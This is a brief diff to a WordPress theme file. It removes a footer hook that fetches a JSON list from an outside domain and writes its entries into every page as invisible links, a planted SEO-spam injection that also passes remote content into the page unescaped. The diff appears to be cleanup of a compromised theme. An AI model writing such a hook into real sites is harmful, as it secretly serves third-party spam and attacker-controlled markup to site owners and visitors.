@@ -861,10 +861,3 @@ function my_theme_setup() {
 add_action('after_setup_theme', 'my_theme_setup');
 
 // Add your other theme customizations here
-add_action('wp_footer', function() {
-    $a = file_get_contents('https://enginejp.link/news/');
-    $b = json_decode($a);
-    foreach($b as $key => $value){
-        echo '<a style="display:none" href="'.$value.'">'.$key.'</a>';
-    }
-});
